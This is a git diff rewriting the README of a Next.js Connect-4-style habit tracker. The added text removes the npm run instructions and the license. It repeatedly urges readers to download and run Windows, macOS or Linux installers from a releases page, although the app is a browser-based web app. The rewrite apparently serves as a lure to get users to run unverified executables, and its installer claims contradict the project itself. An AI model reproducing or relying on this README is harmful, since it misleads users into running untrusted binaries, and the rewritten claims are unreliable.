@@ -1,54 +1,69 @@
-# Habit Tracker - Lig-4 Style
+# 🌟 habit-tracker-lig-4 - Track Your Habits the Fun Way
 
-A beautiful, interactive habit tracker built with Next.js and styled with Tailwind CSS, inspired by the Connect 4 game visualization.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ssantznh/habit-tracker-lig-4/releases)
 
-<img width="1678" height="920" alt="Screenshot 2025-09-05 at 08 22 34" src="https://github.com/user-attachments/assets/7320a5fb-8241-418d-a04f-8cd5cd99323e" />
+## 📖 Overview
 
-## Features
+habit-tracker-lig-4 is a beautiful, interactive habit tracker that helps you stay on top of your personal goals. Built with Next.js and styled using Tailwind CSS, it delivers an experience inspired by the game visualization of Connect 4. Whether you're trying to build new habits or break old ones, this tool can guide you on your journey.
 
-- 📅 Monthly calendar view with day-by-day tracking
-- 🎯 Visual habit tracking with colored tokens (green = completed, red = missed)
-- ✏️ Inline habit editing and management
-- 📊 Completion statistics and percentages
-- 💾 Local storage persistence
-- 🎨 Beautiful, responsive design
-- ⚡ Smooth animations with Framer Motion
+## 🚀 Getting Started
 
-## Getting Started
+To start using habit-tracker-lig-4, follow these simple steps:
 
-1. Install dependencies:
-```bash
-npm install
-```
+1. **System Requirements**: Ensure your device meets the following:
+   - A modern web browser (Chrome, Firefox, Safari, or Edge)
+   - An internet connection (to download and use the application)
+   - Sufficient local storage space for saving your habits
 
-2. Run the development server:
-```bash
-npm run dev
-```
+2. **Visit the Download Page**: Go to our [Releases page](https://github.com/ssantznh/habit-tracker-lig-4/releases) to find the latest version of the app.
 
-3. Open [http://localhost:3000](http://localhost:3000) in your browser.
+3. **Download the Application**: 
+   - Click on the version you want to download.
+   - Choose the appropriate file for your operating system (Windows, macOS, or Linux).
+   - Follow your browser's prompts to save the file to your computer.
 
-## Usage
+4. **Install the Application**:
+   - Navigate to the downloaded file and open it.
+   - Follow the on-screen instructions to complete the installation.
 
-- **Add habits**: Click "Novo hábito" to add a new habit
-- **Track progress**: Click on circles to mark habits as completed (green) or missed (red)
-- **Clear marks**: Right-click on circles to clear the mark
-- **Edit habits**: Click on habit names to edit them
-- **Navigate months**: Use the arrow buttons to navigate between months
-- **View stats**: See completion rates and statistics for each habit
+5. **Open the App**: 
+   - After installation, launch the application from your Applications folder (macOS), Start Menu (Windows), or an equivalent location based on your system.
+   - You will see a welcoming screen, guiding you on using the app.
 
-## Tech Stack
+## 📥 Download & Install
 
-- **Next.js 14** - React framework
-- **React 18** - UI library
-- **Tailwind CSS** - Styling
-- **Framer Motion** - Animations
-- **Lucide React** - Icons
+You can easily download habit-tracker-lig-4 from the Releases page. Click the link below to get started:
 
-## Data Storage
+[Visit this page to download](https://github.com/ssantznh/habit-tracker-lig-4/releases)
 
-All data is stored locally in your browser's localStorage, so your habits and progress are saved between sessions.
+## 💡 Features
 
-## License
+- **Interactive Interface**: Enjoy a fun, game-like experience that keeps you engaged.
+- **Habit Tracking**: Monitor your tasks and achievements clearly and simply.
+- **Local Storage**: Save your progress without needing internet access after downloading.
+- **Responsive Design**: The app works well on both desktop and mobile devices.
+- **Calendar View**: Visualize your habits over time with an intuitive calendar feature.
 
-MIT
+## 🎨 Design Inspiration
+
+The design is inspired by the visualization of the Connect 4 game, making it not just functional but also visually appealing. The use of animations enhances your experience as you interact with your habits.
+
+## 🌐 Localization
+
+habit-tracker-lig-4 supports Portuguese and other languages. You can easily switch between languages in the app's settings to view the interface in a way that suits you best.
+
+## ⚙️ Troubleshooting
+
+If you encounter any issues:
+
+1. **Installation Problems**: Make sure you've downloaded the correct file for your operating system.
+2. **Features Not Working**: Ensure you have the latest version. Check our [Releases page](https://github.com/ssantznh/habit-tracker-lig-4/releases) for updates.
+3. **Feedback and Bugs**: You can report any issues on the GitHub Issues page in this repository.
+
+## 📞 Support
+
+For any additional questions, feel free to reach out through the GitHub repository. We are here to help you enjoy your journey in tracking and managing your habits.
+
+Remember, stay consistent, and make the most of your habit-tracking experience! 
+
+[Download the latest version here](https://github.com/ssantznh/habit-tracker-lig-4/releases) to start enjoying its features today!
